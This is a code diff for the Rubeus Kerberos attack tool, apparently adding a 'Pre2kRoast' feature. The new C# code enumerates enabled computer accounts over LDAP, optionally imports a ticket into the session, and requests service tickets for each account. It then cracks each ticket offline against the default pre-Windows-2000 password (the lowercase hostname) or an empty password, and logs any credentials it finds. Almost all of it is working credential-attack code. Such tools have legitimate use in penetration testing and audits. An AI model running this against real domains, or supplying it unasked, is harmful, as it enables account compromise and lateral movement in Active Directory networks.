@@ -1031,5 +1031,368 @@ namespace Rubeus
                 }
             }
         }
+		
+		public static void Pre2kRoast(List<string> computers = null, string service = "", string domain = "", string dc = "", string OU = "", System.Net.NetworkCredential cred = null, string outFile = "", KRB_CRED TGT = null, string ldapFilter = "", int resultLimit = 0, int delay = 0, int jitter = 0, bool ldaps = false, bool enterprise = false, bool randomspn= false, bool verbose = false)
+        {
+            if (delay != 0)
+            {
+                Console.WriteLine($"[*] Using a delay of {delay} milliseconds between TGS requests.");
+                if (jitter != 0)
+                {
+                    Console.WriteLine($"[*] Using a jitter of {jitter}% between TGS requests.");
+                }
+                Console.WriteLine();
+            }
+
+            
+            if ((computers != null) && (computers.Count != 0))
+            {
+                foreach (string c in computers)
+                {
+                    string spn = string.Format("{0}/{1}", service, c);
+                    if (verbose) {
+                        Console.WriteLine("[*] Ask TGS for {0}", spn);
+                    }
+                    if (TGT != null)
+                    {
+                        // if a TGT .kirbi is supplied, use that for the request
+                        Pre2kCrack(TGT, c, spn, dc, enterprise, outFile);
+                    }
+                    else
+                    {
+                        // otherwise use the KerberosRequestorSecurityToken method
+                        Pre2kCrack(cred, c, spn, domain, outFile);
+                    }
+                    Helpers.RandomDelayWithJitter(delay, jitter);
+                }
+            }
+            else
+            {
+                // inject ticket for LDAP search if supplied
+                if (TGT != null)
+                {
+                    byte[] kirbiBytes = null;
+                    string ticketDomain = TGT.enc_part.ticket_info[0].prealm;
+            
+                    if (String.IsNullOrEmpty(domain))
+                    {
+                        // if a domain isn't specified, use the domain from the referral
+                        domain = ticketDomain;
+                    }
+            
+                    // referral TGT is in use, we need a service ticket for LDAP on the DC to perform the domain searcher
+                    if (ticketDomain != domain)
+                    {
+                        if (String.IsNullOrEmpty(dc))
+                        {
+                            dc = Networking.GetDCName(domain);
+                        }
+            
+                        string tgtUserName = TGT.enc_part.ticket_info[0].pname.name_string[0];
+                        Ticket ticket = TGT.tickets[0];
+                        byte[] clientKey = TGT.enc_part.ticket_info[0].key.keyvalue;
+                        Interop.KERB_ETYPE etype = (Interop.KERB_ETYPE)TGT.enc_part.ticket_info[0].key.keytype;
+            
+                        // check if we've been given an IP for the DC, we'll need the name for the LDAP service ticket
+                        Match match = Regex.Match(dc, @"([0-9A-Fa-f]{1,4}:){7}[0-9A-Fa-f]{1,4}|(\d{1,3}\.){3}\d{1,3}");
+                        if (match.Success)
+                        {
+                            System.Net.IPAddress dcIP = System.Net.IPAddress.Parse(dc);
+                            System.Net.IPHostEntry dcInfo = System.Net.Dns.GetHostEntry(dcIP);
+                            dc = dcInfo.HostName;
+                        }
+            
+                        // request a service tickt for LDAP on the target DC
+                        kirbiBytes = Ask.TGS(tgtUserName, ticketDomain, ticket, clientKey, etype, string.Format("ldap/{0}", dc), etype, null, false, dc, false, enterprise, false);
+                    }
+                    // otherwise inject the TGT to perform the domain searcher
+                    else
+                    {
+                        kirbiBytes = TGT.Encode().Encode();
+                    }
+                    LSA.ImportTicket(kirbiBytes, new LUID());
+                }
+            
+                // build LDAP query
+                string userSearchFilter = "(&(samAccountType=805306369)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))";
+                if (!String.IsNullOrEmpty(ldapFilter))
+                {
+                    userSearchFilter = String.Format("(&{0}({1}))", userSearchFilter, ldapFilter);
+                }
+            
+                List<IDictionary<string, Object>> computerObjects = Networking.GetLdapQuery(cred, OU, dc, domain, userSearchFilter, ldaps);
+                if (computerObjects == null)
+                {
+                    Console.WriteLine("[X] LDAP query failed, try specifying more domain information or specific SPNs.");
+                    return;
+                }
+            
+                try
+                {
+                    if (computerObjects.Count == 0)
+                    {
+                        Console.WriteLine("\r\n[X] No computers found!");
+                    }
+                    else
+                    {
+                        Console.WriteLine("\r\n[*] Total computers: {0}\r\n", computerObjects.Count);
+                    }
+
+                    foreach (IDictionary<string, Object> comp in computerObjects)
+                    {
+                        string samAccountName = (string)comp["samaccountname"];
+                        string hostname = samAccountName.Substring(0, samAccountName.Length - 1);
+                        string spn;
+                        if (randomspn)
+                        {
+                            string[] spns = (string[])comp["serviceprincipalname"];
+                            var random = new Random();
+                            spn = spns[random.Next(spns.Length)];
+                        }
+                        else
+                        {
+                            spn = ((string[])comp["serviceprincipalname"])[0];
+                        }
+                        
+                        if ((!String.IsNullOrEmpty(domain)) && (TGT == null))
+                        {
+                            spn = String.Format("{0}@{1}", spn, domain);
+                        }
+
+                        if (verbose)
+                        {
+                            Console.WriteLine("[*] Ask TGS for {0}", spn);
+                        }
+                        if (TGT != null)
+                        {
+                            // if a TGT .kirbi is supplied, use that for the request
+                            Pre2kCrack(TGT, hostname, spn, dc, enterprise, outFile);
+                        }
+                        else
+                        {
+                            // otherwise use the KerberosRequestorSecurityToken method
+                            Pre2kCrack(cred, hostname, spn, domain, outFile);
+                        }
+                        Helpers.RandomDelayWithJitter(delay, jitter);
+                    }
+            
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine("\r\n[X] Error executing the domain searcher: {0}", ex);
+                    return;
+                }
+            }
+        }
+        
+        public static void Pre2kCrack(KRB_CRED TGT, string hostname, string spn, string dc, bool enterprise, string outFile = "")
+        {
+            Interop.KERB_ETYPE requestEType = Interop.KERB_ETYPE.subkey_keymaterial;
+
+            string tgtUserName = TGT.enc_part.ticket_info[0].pname.name_string[0];
+            string domain = TGT.enc_part.ticket_info[0].prealm.ToLower();
+            Ticket ticket = TGT.tickets[0];
+            byte[] clientKey = TGT.enc_part.ticket_info[0].key.keyvalue;
+            Interop.KERB_ETYPE etype = (Interop.KERB_ETYPE)TGT.enc_part.ticket_info[0].key.keytype;
+            string tgtDomain = TGT.tickets[0].sname.name_string[1];
+
+            byte[] kirbiBytes = Ask.TGS(tgtUserName, domain, ticket, clientKey, etype, spn, requestEType, "", false, dc, false, enterprise, false, false, null, tgtDomain);
+            KRB_CRED TGS = new KRB_CRED(kirbiBytes);
+            
+            byte[] cipherText = TGS.tickets[0].enc_part.cipher;
+            int encType = TGS.tickets[0].enc_part.etype;
+
+            if (CrackTGS(cipherText, encType, hostname, domain, hostname.ToLower())) {
+                string message = String.Format("[=] Found password of {0} -> {1}", hostname, hostname.ToLower());
+                Console.WriteLine(message);
+                if (!String.IsNullOrEmpty(outFile))
+                {
+                    string outFilePath = Path.GetFullPath(outFile);
+                    try
+                    {
+                        File.AppendAllText(outFilePath, message + Environment.NewLine);
+                    }
+                    catch (Exception e)
+                    {
+                        Console.WriteLine("Exception: {0}", e.Message);
+                    }
+                }
+                return;
+            }
+            if (CrackTGS(cipherText, encType, hostname, domain, ""))
+            {
+                string message = String.Format("[=] Found password of { 0} -> empty password", hostname);
+                Console.WriteLine(message);
+                if (!String.IsNullOrEmpty(outFile))
+                {
+                    string outFilePath = Path.GetFullPath(outFile);
+                    try
+                    {
+                        File.AppendAllText(outFilePath, message + Environment.NewLine);
+                    }
+                    catch (Exception e)
+                    {
+                        Console.WriteLine("Exception: {0}", e.Message);
+                    }
+                }
+            }
+        }
+
+        public static void Pre2kCrack(System.Net.NetworkCredential cred, string hostname, string spn, string domain, string outFile = "")
+        {
+            try
+            {
+                // the System.IdentityModel.Tokens.KerberosRequestorSecurityToken approach and extraction of the AP-REQ from the
+                //  GetRequest() stream was constributed to PowerView by @machosec
+                System.IdentityModel.Tokens.KerberosRequestorSecurityToken ticket;
+                if (cred != null)
+                {
+                    ticket = new System.IdentityModel.Tokens.KerberosRequestorSecurityToken(spn, TokenImpersonationLevel.Impersonation, cred, Guid.NewGuid().ToString());
+                }
+                else
+                {
+                    ticket = new System.IdentityModel.Tokens.KerberosRequestorSecurityToken(spn);
+                }
+                byte[] requestBytes = ticket.GetRequest();
+
+                if (!((requestBytes[15] == 1) && (requestBytes[16] == 0)))
+                {
+                    Console.WriteLine("\r\n[X] GSSAPI inner token is not an AP_REQ.\r\n");
+                    return;
+                }
+
+                // ignore the GSSAPI frame
+                byte[] apReqBytes = new byte[requestBytes.Length - 17];
+                Array.Copy(requestBytes, 17, apReqBytes, 0, requestBytes.Length - 17);
+
+                AsnElt apRep = AsnElt.Decode(apReqBytes);
+
+                if (apRep.TagValue != 14)
+                {
+                    Console.WriteLine("\r\n[X] Incorrect ASN application tag.  Expected 14, but got {0}.\r\n", apRep.TagValue);
+                }
+
+                long encType = 0;
+
+                foreach (AsnElt elem in apRep.Sub[0].Sub)
+                {
+                    if (elem.TagValue == 3)
+                    {
+                        foreach (AsnElt elem2 in elem.Sub[0].Sub[0].Sub)
+                        {
+                            if (elem2.TagValue == 3)
+                            {
+                                foreach (AsnElt elem3 in elem2.Sub[0].Sub)
+                                {
+                                    if (elem3.TagValue == 0)
+                                    {
+                                        encType = elem3.Sub[0].GetInteger();
+                                    }
+
+                                    if (elem3.TagValue == 2)
+                                    {
+                                        byte[] cipherText = elem3.Sub[0].GetOctetString();
+                                        if (CrackTGS(cipherText, (int)encType, hostname, domain, hostname.ToLower()))
+                                        {
+                                            string message = String.Format("[=] Found password of {0} -> {1}", hostname, hostname.ToLower());
+                                            Console.WriteLine(message);
+                                            if (!String.IsNullOrEmpty(outFile))
+                                            {
+                                                string outFilePath = Path.GetFullPath(outFile);
+                                                try
+                                                {
+                                                    File.AppendAllText(outFilePath, message + Environment.NewLine);
+                                                }
+                                                catch (Exception e)
+                                                {
+                                                    Console.WriteLine("Exception: {0}", e.Message);
+                                                }
+                                            }
+                                            return;
+                                        }
+                                        if (CrackTGS(cipherText, (int)encType, hostname, domain, ""))
+                                        {
+                                            string message = String.Format("[=] Found password of { 0} -> empty password", hostname);
+                                            Console.WriteLine(message);
+                                            if (!String.IsNullOrEmpty(outFile))
+                                            {
+                                                string outFilePath = Path.GetFullPath(outFile);
+                                                try
+                                                {
+                                                    File.AppendAllText(outFilePath, message + Environment.NewLine);
+                                                }
+                                                catch (Exception e)
+                                                {
+                                                    Console.WriteLine("Exception: {0}", e.Message);
+                                                }
+                                            }
+                                        }
+                                    }
+                                    
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("\r\n [X] Error during request for SPN {0} : {1}\r\n", spn, ex.InnerException.Message);
+            }
+        }
+
+        public static bool CrackTGS(byte[] cipherText, int encType, string hostname, string domain, string password)
+        {
+            string salt = String.Format("{0}{1}", domain.ToUpper(), hostname);
+            string hash;
+            byte[] key;
+            Interop.KERB_ETYPE tgsEType;
+            switch (encType)
+            {
+                // aes128
+                case 17:
+                    {
+                        tgsEType = Interop.KERB_ETYPE.aes128_cts_hmac_sha1;
+                        hash = Crypto.KerberosPasswordHash(tgsEType, password, salt);
+                        key = Helpers.StringToByteArray(hash);
+                        break;
+                    }
+                // aes256
+                case 18:
+                    {
+                        tgsEType = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;
+                        hash = Crypto.KerberosPasswordHash(tgsEType, password, salt);
+                        key = Helpers.StringToByteArray(hash);
+                        break;
+                    }
+                // rc4
+                case 23:
+                    {
+                        tgsEType = Interop.KERB_ETYPE.rc4_hmac;
+                        hash = Crypto.KerberosPasswordHash(tgsEType, password);
+                        key = Helpers.StringToByteArray(hash);
+                        break;
+                    }
+                default:
+                    {
+                        return false;
+                    }
+            }
+            try
+            {
+                // decrypt the TGS
+                byte[] dec = Crypto.KerberosDecrypt(tgsEType, KRB_KEY_USAGE_AS_REP_TGS_REP, key, cipherText);
+                var encTicket = AsnElt.Decode(dec, false);
+
+                // validate that the decrypted info contains the data
+                EncTicketPart a = new EncTicketPart(encTicket.Sub[0], null, false);
+                return true;
+            }
+            catch
+            {
+                return false;
+            }
+        }
+		
     }
 }
